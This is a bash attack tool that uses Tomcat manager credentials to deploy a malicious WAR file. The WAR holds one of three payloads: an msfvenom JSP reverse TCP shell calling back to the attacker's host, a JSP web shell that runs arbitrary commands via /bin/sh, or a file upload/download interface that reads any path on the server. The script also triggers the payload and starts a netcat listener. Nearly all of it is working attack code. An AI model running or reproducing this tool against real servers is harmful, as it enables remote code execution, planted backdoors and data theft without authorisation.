#!/bin/bash
#
# Tomcat WAR Shell Deployment Tool
# Modern rewrite with enhanced features and better error handling.. (beta)..
# Version: 2.0.0
#

set -euo pipefail

# Colors
R='\033[0;31m' G='\033[0;32m' Y='\033[1;33m'
B='\033[0;34m' C='\033[0;36m' M='\033[0;35m' W='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD_DIR="${SCRIPT_DIR}/payloads"
TEMP_DIR=$(mktemp -d)
trap "rm -rf ${TEMP_DIR}" EXIT

banner() {
    echo -e "${G}╔═══════════════════════════════════════════════════════╗"
    echo "║       Tomcat WAR Shell Deployment Tool v2.0          ║"
    echo "║       Enhanced Multi-Payload Deployment Suite        ║"
    echo -e "╚═══════════════════════════════════════════════════════╝${W}\n"
}

usage() {
    cat << EOF
${C}Usage:${W}
  $0 [OPTIONS] -l LHOST -p LPORT -t RHOST -r RPORT -u USER -P PASS

${C}Required Options:${W}
  -l, --lhost LHOST        Local host (your IP for reverse shell)
  -p, --lport LPORT        Local port (listener port)
  -t, --target RHOST       Target Tomcat server IP/hostname
  -r, --rport RPORT        Target Tomcat manager port (default: 8080)
  -u, --user USER          Tomcat manager username
  -P, --pass PASS          Tomcat manager password

${C}Optional Settings:${W}
  -n, --name NAME          WAR filename (default: random)
  -T, --type TYPE          Shell type: reverse|bind|cmd|upload (default: reverse)
  -s, --ssl                Use HTTPS for Tomcat connection
  -L, --listener           Auto-start netcat listener
  -k, --keep               Keep WAR file after deployment
  -v, --verbose            Verbose output
  -h, --help               Show this help

${C}Shell Types:${W}
  reverse    Reverse TCP shell (requires -l/-p)
  bind       Bind shell on target (requires -p for bind port)
  cmd        Web-based command shell
  upload     File upload/download interface

${C}Examples:${W}
  ${Y}# Deploy reverse shell:${W}
  $0 -l 10.10.14.5 -p 4444 -t 10.10.10.95 -r 8080 -u tomcat -P s3cret

  ${Y}# Deploy with auto-listener:${W}
  $0 -l 10.10.14.5 -p 4444 -t 10.10.10.95 -r 8080 -u tomcat -P s3cret -L

  ${Y}# Deploy web command shell:${W}
  $0 -T cmd -t 10.10.10.95 -r 8080 -u tomcat -P s3cret

  ${Y}# Deploy file upload interface:${W}
  $0 -T upload -t 10.10.10.95 -r 8080 -u tomcat -P s3cret

  ${Y}# HTTPS deployment:${W}
  $0 -s -l 10.10.14.5 -p 4444 -t 10.10.10.95 -r 8443 -u admin -P admin

${C}Environment Variables:${W}
  TOMCAT_USER     Default username
  TOMCAT_PASS     Default password
  
${C}References:${W}
  • https://github.com/p0dalirius/Tomcat-webshell-application
  • https://github.com/mgeeky/tomcatWarDeployer
  • https://github.com/ivan-sincek/java-reverse-tcp
  • https://github.com/gquere/javaWebShell
EOF
}

log() { echo -e "${2:-$B}[${1:0:1}]${W} ${@:2}"; }
error() { log "- $*" "$R" >&2; exit 1; }
verbose() { [ "${VERBOSE:-false}" = true ] && log "i $*" "$C"; }

check_deps() {
    local missing=()
    local deps=(curl)
    
    [ "$SHELL_TYPE" = "reverse" ] && deps+=(msfvenom nc)
    [ "$AUTO_LISTENER" = true ] && deps+=(nc)
    
    for cmd in "${deps[@]}"; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        error "Missing dependencies: ${missing[*]}"
    fi
}

test_connectivity() {
    log "* Testing connectivity to $RHOST:$RPORT..." "$Y"
    
    if ! timeout 5 bash -c "echo > /dev/tcp/$RHOST/$RPORT" 2>/dev/null; then
        error "Cannot connect to $RHOST:$RPORT"
    fi
    
    log "+ Target is reachable" "$G"
}

test_auth() {
    log "* Testing Tomcat Manager authentication..." "$Y"
    
    local url="${PROTOCOL}://${RHOST}:${RPORT}/manager/text/list"
    local status=$(curl -u "$USER:$PASS" -s -o /dev/null -w "%{http_code}" \
        ${SSL_OPTS} "$url" 2>/dev/null)
    
    case $status in
        200)
            log "+ Authentication successful" "$G"
            return 0
            ;;
        401)
            error "Authentication failed (Invalid credentials)"
            ;;
        404)
            error "Manager application not found (Is it deployed?)"
            ;;
        *)
            error "Unexpected status code: $status"
            ;;
    esac
}

generate_random_name() {
    echo "shell_$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)"
}

create_reverse_shell() {
    log "* Generating reverse shell payload..." "$Y"
    
    local war_file="${TEMP_DIR}/${FNAME}.war"
    
    if ! msfvenom -p java/jsp_shell_reverse_tcp \
        LHOST="$LHOST" LPORT="$LPORT" \
        -f war -o "$war_file" &>/dev/null; then
        error "Failed to generate payload"
    fi
    
    log "+ Payload generated: ${war_file}" "$G"
    echo "$war_file"
}

create_cmd_shell() {
    log "* Creating web command shell..." "$Y"
    
    local war_file="${TEMP_DIR}/${FNAME}.war"
    local jsp_file="${TEMP_DIR}/cmd.jsp"
    
    cat > "$jsp_file" << 'EOJSP'
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            out.println("<pre>");
            while ((line = br.readLine()) != null) {
                out.println(line);
            }
            out.println("</pre>");
            p.waitFor();
        } catch (Exception e) {
            out.println("<pre>Error: " + e.getMessage() + "</pre>");
        }
    } else {
%>
<!DOCTYPE html>
<html>
<head><title>Web Shell</title></head>
<body>
    <h2>Command Shell</h2>
    <form method="GET">
        <input type="text" name="cmd" size="50" autofocus>
        <input type="submit" value="Execute">
    </form>
</body>
</html>
<% } %>
EOJSP
    
    # Create WAR structure
    mkdir -p "${TEMP_DIR}/WEB-INF"
    mv "$jsp_file" "${TEMP_DIR}/"
    
    (cd "$TEMP_DIR" && jar -cf "$war_file" cmd.jsp WEB-INF) &>/dev/null
    
    log "+ Web shell created: ${war_file}" "$G"
    echo "$war_file"
}

create_upload_shell() {
    log "* Creating file upload interface..." "$Y"
    
    local war_file="${TEMP_DIR}/${FNAME}.war"
    local jsp_file="${TEMP_DIR}/upload.jsp"
    
    cat > "$jsp_file" << 'EOJSP'
<%@page import="java.io.*,java.nio.file.*"%>
<%@page import="org.apache.tomcat.util.http.fileupload.*"%>
<%@page import="org.apache.tomcat.util.http.fileupload.disk.*"%>
<%@page import="org.apache.tomcat.util.http.fileupload.servlet.*"%>
<%
    String output = "";
    String param = "file";
    
    if ("POST".equals(request.getMethod()) && request.getContentType() != null 
        && request.getContentType().startsWith("multipart/form-data")) {
        
        ServletFileUpload upload = new ServletFileUpload(new DiskFileItemFactory());
        for (FileItem item : upload.parseRequest(new ServletRequestContext(request))) {
            if (param.equals(item.getFieldName())) {
                try {
                    String filename = new File(item.getName()).getName();
                    String path = System.getProperty("user.dir") + File.separator + filename;
                    item.write(new File(path));
                    output = "SUCCESS: Uploaded to " + path;
                } catch (Exception e) {
                    output = "ERROR: " + e.getMessage();
                }
            }
        }
    } else if ("GET".equals(request.getMethod()) && request.getParameter(param) != null) {
        try {
            String filepath = request.getParameter(param).trim();
            byte[] data = Files.readAllBytes(Paths.get(filepath));
            response.setHeader("Content-Type", "application/octet-stream");
            response.setHeader("Content-Disposition", 
                "attachment; filename=\"" + Paths.get(filepath).getFileName() + "\"");
            response.getOutputStream().write(data);
            response.getOutputStream().flush();
            return;
        } catch (Exception e) {
            output = "ERROR: " + e.getMessage();
        }
    }
%>
<!DOCTYPE html>
<html>
<head><title>File Manager</title></head>
<body>
    <h2>File Upload/Download</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <input type="submit" value="Upload">
    </form>
    <pre><%= output %></pre>
    <p>Download: ?file=/path/to/file</p>
</body>
</html>
EOJSP
    
    mkdir -p "${TEMP_DIR}/WEB-INF"
    mv "$jsp_file" "${TEMP_DIR}/"
    
    (cd "$TEMP_DIR" && jar -cf "$war_file" upload.jsp WEB-INF) &>/dev/null
    
    log "+ Upload interface created: ${war_file}" "$G"
    echo "$war_file"
}

deploy_war() {
    local war_file="$1"
    local url="${PROTOCOL}://${RHOST}:${RPORT}/manager/text/deploy?path=/${FNAME}"
    
    log "* Deploying WAR to target..." "$Y"
    verbose "URL: $url"
    
    local response=$(curl -u "$USER:$PASS" \
        --upload-file "$war_file" \
        -s ${SSL_OPTS} "$url")
    
    if echo "$response" | grep -q "OK"; then
        log "+ Deployment successful" "$G"
        return 0
    else
        error "Deployment failed: $response"
    fi
}

trigger_shell() {
    local url="${PROTOCOL}://${RHOST}:${RPORT}/${FNAME}/"
    
    case $SHELL_TYPE in
        reverse)
            log "* Triggering reverse shell..." "$Y"
            sleep 2
            curl -s ${SSL_OPTS} "$url" &>/dev/null &
            ;;
        cmd)
            log "+ Web shell accessible at:" "$G"
            echo -e "   ${C}${url}${W}"
            ;;
        upload)
            log "+ Upload interface accessible at:" "$G"
            echo -e "   ${C}${url}${W}"
            echo -e "   ${C}Upload: POST with file parameter${W}"
            echo -e "   ${C}Download: GET ?file=/path/to/file${W}"
            ;;
    esac
}

start_listener() {
    [ "$AUTO_LISTENER" != true ] && return
    [ "$SHELL_TYPE" != "reverse" ] && return
    
    log "+ Starting listener on port $LPORT..." "$G"
    sleep 1
    nc -lvnp "$LPORT"
}

cleanup() {
    [ "$KEEP_WAR" = true ] && return
    
    log "* Cleaning up..." "$Y"
    
    local url="${PROTOCOL}://${RHOST}:${RPORT}/manager/text/undeploy?path=/${FNAME}"
    local response=$(curl -u "$USER:$PASS" -s ${SSL_OPTS} "$url")
    
    if echo "$response" | grep -q "OK"; then
        log "+ Undeployed successfully" "$G"
    else
        log "! Failed to undeploy (manual cleanup required)" "$Y"
    fi
}

main() {
    banner
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -l|--lhost) LHOST="$2"; shift 2 ;;
            -p|--lport) LPORT="$2"; shift 2 ;;
            -t|--target) RHOST="$2"; shift 2 ;;
            -r|--rport) RPORT="$2"; shift 2 ;;
            -u|--user) USER="$2"; shift 2 ;;
            -P|--pass) PASS="$2"; shift 2 ;;
            -n|--name) FNAME="$2"; shift 2 ;;
            -T|--type) SHELL_TYPE="$2"; shift 2 ;;
            -s|--ssl) USE_SSL=true; shift ;;
            -L|--listener) AUTO_LISTENER=true; shift ;;
            -k|--keep) KEEP_WAR=true; shift ;;
            -v|--verbose) VERBOSE=true; shift ;;
            -h|--help) usage; exit 0 ;;
            *) error "Unknown option: $1" ;;
        esac
    done
    
    # Set defaults
    : ${RPORT:=8080}
    : ${SHELL_TYPE:=reverse}
    : ${FNAME:=$(generate_random_name)}
    : ${USE_SSL:=false}
    : ${AUTO_LISTENER:=false}
    : ${KEEP_WAR:=false}
    : ${VERBOSE:=false}
    : ${USER:=${TOMCAT_USER:-}}
    : ${PASS:=${TOMCAT_PASS:-}}
    
    # Validate required params
    [ -z "$RHOST" ] && error "Target host required (-t)"
    [ -z "$USER" ] && error "Username required (-u)"
    [ -z "$PASS" ] && error "Password required (-P)"
    
    if [ "$SHELL_TYPE" = "reverse" ]; then
        [ -z "$LHOST" ] && error "LHOST required for reverse shell (-l)"
        [ -z "$LPORT" ] && error "LPORT required for reverse shell (-p)"
    fi
    
    # Setup SSL
    if [ "$USE_SSL" = true ]; then
        PROTOCOL="https"
        SSL_OPTS="-k"
    else
        PROTOCOL="http"
        SSL_OPTS=""
    fi
    
    # Display config
    log "+ Configuration:" "$G"
    echo -e "   Target:    ${C}${RHOST}:${RPORT}${W}"
    echo -e "   User:      ${C}${USER}${W}"
    echo -e "   Shell:     ${C}${SHELL_TYPE}${W}"
    echo -e "   Name:      ${C}${FNAME}${W}"
    [ "$SHELL_TYPE" = "reverse" ] && echo -e "   Callback:  ${C}${LHOST}:${LPORT}${W}"
    echo ""
    
    # Execute
    check_deps
    test_connectivity
    test_auth
    
    # Generate payload
    case $SHELL_TYPE in
        reverse) war_file=$(create_reverse_shell) ;;
        cmd) war_file=$(create_cmd_shell) ;;
        upload) war_file=$(create_upload_shell) ;;
        *) error "Invalid shell type: $SHELL_TYPE" ;;
    esac
    
    deploy_war "$war_file"
    trigger_shell
    
    [ "$SHELL_TYPE" = "reverse" ] && start_listener
    
    # Cleanup on exit (only for reverse shells)
    [ "$SHELL_TYPE" = "reverse" ] && cleanup
}

main "$@"
